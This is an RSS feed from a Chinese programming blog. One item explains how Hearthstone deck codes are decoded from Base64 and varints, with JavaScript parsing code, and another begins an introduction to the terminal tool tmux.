<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>CodeShurrik</title>
    <description>shurrik blog</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 21 May 2020 13:44:16 +0800</pubDate>
    <lastBuildDate>Thu, 21 May 2020 13:44:16 +0800</lastBuildDate>
    <generator>Jekyll v3.8.6</generator>
    
      <item>
        <title>炉石卡组原理解析</title>
        <description>&lt;p&gt;最近看Base64的时候看到了知乎上一个关于炉石卡组代码的帖子，它本质上就是用一个Base64编码的字符串来存储卡组信息。你有时会见到以=或者==结尾的卡组代码，这正是Base64编码的典型特征。&lt;/p&gt;

&lt;h3 id=&quot;dbf-id&quot;&gt;DBF ID&lt;/h3&gt;

&lt;p&gt;为了了解编码的机制，我们需要先介绍DBF ID。这是每张炉石卡牌（包括可收集卡牌、衍生卡牌、冒险模式专属卡牌、英雄皮肤等）的唯一标识符。而炉石卡组代码正是使用DBF ID来表示每张卡牌。这也是能够卡出下图这种 BUG 的原因,皮肤被标记为了一张紫卡。
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/82526473-b262a480-9b66-11ea-9781-a4a23750a614.png&quot; alt=&quot;hsdeck1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DBF ID可在游戏文件中找到。更加方便的方法是通过 &lt;a href=&quot;https://hearthstonejson.com&quot;&gt;HearthstoneJSON&lt;/a&gt; ，这上面提供了相关API。也可以在这个网站上直接下载最新的&lt;code class=&quot;highlighter-rouge&quot;&gt;cards.collectible.json&lt;/code&gt;，这里面包含了所有可收集卡牌的信息，例如各种语言的卡牌名称、描述等。&lt;/p&gt;

&lt;h3 id=&quot;格式&quot;&gt;格式&lt;/h3&gt;

&lt;p&gt;如前所述，卡组代码是 Base64 编码的字符串。我们先来解码它，许多编程语言都可以做到这一点，以js 为例：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parse_deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;binary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;{1,2}&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个函数会先将Base64字符串解码成2进制，然后转换成16进制，再按每两个元素切割，最后从16进制字符串转化为整型并返回。也就是说，它们可以是 0x00-0xff，即 0-255。&lt;/p&gt;

&lt;p&gt;现在我们得到的是一个由整数组成的数组。更具体的来说，就是 varint。还需要进一步的解码，才能读取出有用的信息：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;data.shift()&lt;/code&gt;会将数组的第一个元素移出数组，并返回它的值。&lt;code class=&quot;highlighter-rouge&quot;&gt;read_varint()&lt;/code&gt;函数完成了解码过程，不断地执行&lt;code class=&quot;highlighter-rouge&quot;&gt;read_varint()&lt;/code&gt;，直到取完arr中的元素，就能把内容全部解码出来。&lt;/p&gt;

&lt;p&gt;根据作用，可以把解码后的卡组代码分为两个部分：元数据块和卡牌块。&lt;/p&gt;

&lt;h3 id=&quot;元数据块&quot;&gt;元数据块&lt;/h3&gt;

&lt;p&gt;在arr数组中，前五个元素分别为：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保留字节 0x00&lt;/li&gt;
  &lt;li&gt;版本号（固定为 1）&lt;/li&gt;
  &lt;li&gt;模式（1 为狂野，2 为标准）&lt;/li&gt;
  &lt;li&gt;使用英雄卡牌的数量（固定为 1）&lt;/li&gt;
  &lt;li&gt;使用的英雄卡牌的类型（长度不确定，一般是 1-3 位）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可见卡组代码以字节 0x00 开头。然后是编码版本号，目前始终为 1。虽然这五个元素并没有官方名称，不过从作用上可以看作元数据。&lt;/p&gt;

&lt;h3 id=&quot;卡牌块&quot;&gt;卡牌块&lt;/h3&gt;

&lt;p&gt;在元数据块之后，继续读取arr的元素，那么接下来就轮到卡牌块了。它按以下顺序分为三对长度 + 数组的组合：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;卡组中存在一张的卡&lt;/li&gt;
  &lt;li&gt;卡组中存在两张的卡&lt;/li&gt;
  &lt;li&gt;卡组中存在 n 张的卡&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;每张卡都用 varint 型的 DBF ID 表示。&lt;/p&gt;

&lt;p&gt;所谓「卡组中存在 n 张的卡」，指的是卡组中的所有其他卡牌。此数组是一个 varint 对组成的列表，每一对的第一个元素表示 DBF ID，第二个元素是该卡牌在卡组中出现的次数。它应该只包含在牌组中至少出现三次的牌，因而意味着它（在这种情况下）对于构筑卡组应当是空的（毕竟一张卡最多只能带两张）。&lt;/p&gt;

&lt;p&gt;尽管最终排序无关紧要，但卡牌仍会在各自所在的数组中，按 DBF ID 的升序进行排序，以便始终为相同的卡组生成相同的卡组代码。我们称所有按照这种方式排列卡牌列表（包括英雄）的卡组代码为规范的卡组代码。下面的参考实现应该已经可以生成规范的卡组代码：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parse_deck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reserve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reserve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Invalid deckstring&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Unsupported deckstring version &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_heroes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_xn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_xn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时，再通过建立 DBF ID与卡牌对应关系的数据库，就能够实现在游戏外导入、导出和编辑卡组的功能了。不论是官方的卡牌工具，还是第三方平台（如旅法师营地、盒子）的套牌编辑功能，原理都是相似的。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://ixjx.herokuapp.com&quot;&gt;搭在heroku上的API&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 21 May 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-05-21/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-21/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</guid>
        
        <category>炉石传说</category>
        
        
        <category>游戏</category>
        
      </item>
    
      <item>
        <title>tmux + oh-my-tmux使用指北</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux是什么&quot; id=&quot;markdown-toc-tmux是什么&quot;&gt;tmux是什么&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的session&quot; id=&quot;markdown-toc-tmux的session&quot;&gt;tmux的session&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的window&quot; id=&quot;markdown-toc-tmux的window&quot;&gt;tmux的window&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的pane&quot; id=&quot;markdown-toc-tmux的pane&quot;&gt;tmux的pane&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux-window中的历史输出查看&quot; id=&quot;markdown-toc-tmux-window中的历史输出查看&quot;&gt;tmux window中的历史输出查看&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux是什么&quot;&gt;tmux是什么&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　我们在linux服务器上的工作一般都是通过一个终端连接软件连接到远端系统进行操作，例如使用xshell或者SecureCRT工具通过ssh进行远程连接。&lt;/p&gt;

&lt;p&gt;　　在使用过程中，如果要做比较耗时的操作，例如有时候进行编译，或者下载大文件需要比较长的时间，一般情况下是下班之后直接运行希望第二天早上过来运行完成，这样就不用耽误工作时间。但是网络有时候不稳定，或者timeout，可能在半夜会出现连接断掉的情况，一旦连接断掉，所执行的程序也就中断，当然可以写一个脚本后台运行，但是总不能每次都写脚本吧。&lt;/p&gt;

&lt;p&gt;　　那么有没有一种工具可以解决这样的问题呢，当然是有的了，比如这里提到的tmux。其实类似tmux的工具还有很多。例如gnu screen等。&lt;/p&gt;

